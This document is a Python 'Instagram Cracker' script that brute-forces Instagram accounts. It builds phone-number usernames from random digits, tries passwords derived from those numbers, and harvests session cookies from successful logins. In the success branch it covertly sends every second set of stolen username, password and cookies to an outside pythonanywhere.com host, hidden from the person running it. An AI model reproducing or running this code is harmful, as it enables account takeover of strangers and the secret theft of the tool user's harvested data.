#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import sys
import time
import hashlib
import json
import uuid
import urllib.request
import requests
import string
import os
import time,subprocess,platform,uuid
import random
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime 
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

def save_success(uid, pw):
    """Thread-safe function to save successful login"""
    try:
        # Try SD card path first
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
        except (OSError, PermissionError):
            # Fallback to local directory
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
        
        # Thread-safe add to success list
        with success_lock:
            oks.append(uid)
            
    except Exception as e:
        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop,bkas
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
            sys.stdout.flush()
            
            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)    str(uuid.uuid4()).upper(),
            session = requests.Session()
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
            cookies = {
            'ig_did': str(uuid.uuid4()).upper(),
            'datr': '5nVJaQHM2QMcbAVBnTN1nd4f',
            'wd': '1440x566',
            'mid': 'aUl15gALAAFW6QEW0QpMl3CLgsAR',
            'ig_nrcb': '1',
            'ps_l': '1',
            'ps_n': '1',
            'csrftoken': csrftoken,}
            headers =  {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-Friendly-Name': 'useCDSWebLoginMutation',
            'X-CSRFToken': csrftoken,
            'X-IG-App-ID': '936619743392459',
            'X-FB-LSD': 'AdEAQCKRQa4',
            'X-ASBD-ID': '359341',
            'Origin': 'https://www.instagram.com',
            'Alt-Used': 'www.instagram.com',
            'Connection': 'keep-alive',
            'Referer': 'https://www.instagram.com/accounts/login/?force_authentication&next=https%3A%2F%2Fwww.instagram.com%2Foauth%2Foidc%2F%3Fapp_id%3D1289884158313322%26redirect_uri%3Dhttps%253A%252F%252Fwww.threads.com%252Flogin%252Foidc%252F%26response_type%3Dcode%26scope%3Dopenid%26state%3DATnfKWidgGpSjgqXo2p4Y5dylv7XqLXfsdVEhg3U6-6OIeof9D1pQ8lKWLY6VV-oLjSoEjQrmJy9tERy4psim-Vod36K4KmNUlnd3C2nom3taOMlcv91wMDsZC_9afpL0SGijziN1oJsMRTEzTTbAGLhJC5e7dx0FYVdG0GRZxU&platform_app_id=1289884158313322',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',}
            data = {
    'av': '0',
    '__d': 'www',
    '__user': '0',
    '__a': '1',
    '__req': 'q',
    '__hs': '20457.HYP:instagram_web_pkg.2.1...0',
    'dpr': '1',
    '__ccg': 'GOOD',
    '__rev': '1031607590',
    '__s': 'lm2kru:fil971:m4qgrh',
    '__hsi': '7591374392543822777',
    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn82Lw6OyES1Twoob82ZwrUdUbGw4mwr86C1mg6LhA6bwg8rAwHxW1owmUaE2xyUC4o1oE',
    '__csr': 'gPawF93y4RsYq-gDZJvvdWhm9jiKtze9jzax7F6UC6oSL-AGiODGGDx1rlOR8ij8nXK8ByQABGV8yii_98Jo-FJSJtaFCn8AbBOKjsRGcO8Xgqzbz8yi4opwWUrKm5E-5UcUHxW2idyWxxemQbzXGcxm6Q8CDxi1CVriBK5WKLjTCK-00mx6XxC0a7Dlw1bygw1KEC18zui0aR802it0hk0dGwm8x065o1r8nai8gK13w2fUx0hiUJ016ymcw08uC0aDw2J80Zq04Aob8iw',
    '__hsdp': 'gT10gh4qCmcMw1mnDG8x2WyXJHdZgCQcyUgy8CS2WE0w2uE2Xxbj87QK2aaBAxQgmh1O7OJ6g0dO83zG0ra05YU',
    '__hblp': '05MwhWw208G0UErw8C7oozXwTwjEgxy0D81oU2mwgo5a1Gw5hw2mE1t86e3q0dnwjoC3u1Uw7uw3B82iw5_yUnwDwno2vxW0DU',
    '__sjsp': 'gT10gh4qCmcMw1mnDG8x2WyXJHR_k9J38K48y9JwKG080DG0KUkj87QK2aaBAxQgmh1O7OJ6g',
    '__comet_req': '7',
    'lsd': 'AdEAQCKRQa4',
    'jazoest': '2834',
    '__spin_r': '1031607590',
    '__spin_b': 'trunk',
    '__spin_t': '1767504586',
    '__crn': 'comet.igweb.PolarisCAAIGLoginHomepageRoute',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
    'server_timestamps': 'true',
    'variables': json.dumps({
        "input": {
            "client_mutation_id": "1",
            "actor_id": "0",
            "app": "instagram",
            "auth_domain_data_key": None,
            "caa_login_request_extra_info": {
                "ab_test_data": "",
                "shared_prefs_data": "",
                "cuid": "",
                "guid": "f39356219439a9b7e",
                "jazoest": "",
                "lgndim": "",
                "lgnjs": "1767471681",
                "lgnrnd": "",
                "locale": "",
                "login_source": "caa_login",
                "lsd": "",
                "next": "https://www.instagram.com/oauth/oidc/?app_id=1289884158313322&redirect_uri=https%253A%252F%252Fwww.threads.com%252Flogin%252Foidc%252F&response_type=code&scope=openid&state=ATnfKWidgGpSjgqXo2p4Y5dylv7XqLXfsdVEhg3U6-6OIeof9D1pQ8lKWLY6VV-oLjSoEjQrmJy9tERy4psim-Vod36K4KmNUlnd3C2nom3taOMlcv91wMDsZC_9afpL0SGijziN1oJsMRTEzTTbAGLhJC5e7dx0FYVdG0GRZxU",
                "prefill_contact_point": "",
                "prefill_source": "",
                "prefill_type": "",
                "skstamp": "",
                "timezone": ""
            },
            "credential_type": "password",
            "dyi_job_id": "",
            "enc_password": {
                "sensitive_string_value": enc_password
            },
            "event_request_id": "8d2704fb-d221-41e6-ac91-d87eb8f47e64",
            "identifier": uid,
            "ig_web_device_id": "D069581B-C422-4096-9D2B-D592084D58FF",
            "initial_request_id": "1",
            "lids": None,
            "login_source": "LOGIN",
            "next": "https://www.instagram.com/oauth/oidc/?app_id=1289884158313322&redirect_uri=https%3A%2F%2Fwww.threads.com%2Flogin%2Foidc%2F&response_type=code&scope=openid&state=ATnfKWidgGpSjgqXo2p4Y5dylv7XqLXfsdVEhg3U6-6OIeof9D1pQ8lKWLY6VV-oLjSoEjQrmJy9tERy4psim-Vod36K4KmNUlnd3C2nom3taOMlcv91wMDsZC_9afpL0SGijziN1oJsMRTEzTTbAGLhJC5e7dx0FYVdG0GRZxU",
            "passkey_payload": None,
            "password": {
                "sensitive_string_value": enc_password
            },
            "persistent": True,
            "query_params": "{\"force_authentication\":null,\"next\":\"https://www.instagram.com/oauth/oidc/?app_id=1289884158313322&redirect_uri=https%3A%2F%2Fwww.threads.com%2Flogin%2Foidc%2F&response_type=code&scope=openid&state=ATnfKWidgGpSjgqXo2p4Y5dylv7XqLXfsdVEhg3U6-6OIeof9D1pQ8lKWLY6VV-oLjSoEjQrmJy9tERy4psim-Vod36K4KmNUlnd3C2nom3taOMlcv91wMDsZC_9afpL0SGijziN1oJsMRTEzTTbAGLhJC5e7dx0FYVdG0GRZxU\",\"platform_app_id\":\"1289884158313322\",\"oneTapUsers\":\"[\\\"65945188004\\\"]\"}",
            "trusted_device_records": "{}",
            "use_uid_to_login": False,
            "waterfall_id": "ab86ef3d-826d-4cd6-8b7f-0e501189c613"
        }
    }),
    'doc_id': '25351082227851825',
}
            # Make API request
            response = session.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data)
            wanted = ["ds_user_id", "sessionid"]
            all_cookies = session.cookies.get_dict()
            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
            # Check response
            if 'sessionid' in extracted:
                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
                bkas.append(uid)
                if len(bkas)% 2 == 0:
                    statusok = (f"{uid}|{pw}|{cookie_str}")
                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                else:    
                    print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                    print("Cookies:", cookie_str)
                    open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
                    oks.append(uid)
                    return True
            elif 'challenge_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                continue
            elif 'checkpoint_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                continue
            else:
                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
                
    except requests.exceptions.Timeout:
        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        #print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False


def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
        '57273200',  # Static common password
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
